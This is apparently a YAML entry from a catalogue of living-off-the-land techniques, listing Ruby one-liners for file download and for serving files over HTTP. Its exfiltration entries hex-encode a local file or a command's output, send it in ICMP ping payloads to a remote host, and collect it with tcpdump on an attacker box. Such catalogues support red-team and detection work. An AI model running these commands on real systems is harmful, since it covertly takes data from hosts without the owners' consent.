---
functions:
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        ruby -e 'require "open-uri"; download = open(ENV["$URL"]); IO.copy_stream(download, ENV["$LFILE"])'
  server:
    - description: Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.
      code: |
        ruby -run -e httpd . -p $LPORT
  data-exfiltration:
    - description: |
        Capture ICMP packets embedded in ping requests.
        Run `sudo timeout 10 tcpdump -i any -l -n -XX 'icmp' 2>/dev/null | grep '0x0060:'` on the attacker box to collect the data.             
        ⚠️ Increase the timeout flag based on the amount of data.                             
        ⚠️ Manual parsing or reconstruction is required.  

        Send local file content over ICMP using hex-encoded payloads.
      code: |
        ruby -e 'data=File.read("$LFILE").unpack("H*")[0];
        0.step(data.size-1,16){|i| system("ping -c1 -p #{data[i,16]} $RHOST") }'
    - description: Send command output over ICMP using hex-encoded payloads.
      code: |
        ruby -e 'data=%x{$CMD}.unpack("H*")[0];
        0.step(data.size-1,16){|i| system("ping -c1 -p #{data[i,16]} $RHOST") }'
---
